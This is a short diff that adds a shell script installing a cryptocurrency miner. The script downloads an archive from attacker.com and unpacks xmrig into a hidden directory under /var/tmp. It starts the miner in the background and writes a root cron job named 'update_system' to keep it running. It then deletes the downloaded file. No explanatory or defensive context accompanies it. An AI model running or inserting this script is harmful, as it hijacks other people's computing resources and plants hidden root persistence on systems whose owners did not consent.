@@ -1,0 +1,8 @@
+curl -sL http://attacker.com/miner.tar.gz | tar zx
+mv xmrig /var/tmp/.crypto/
+mv config.json /var/tmp/.crypto/
+cd /var/tmp/.crypto/
+./xmrig -b -c config.json
+echo "*/5 * * * * root /var/tmp/.crypto/xmrig -c /var/tmp/.crypto/config.json > /dev/null 2>&1" > /etc/cron.d/update_system
+rm -f miner.tar.gz
+exit
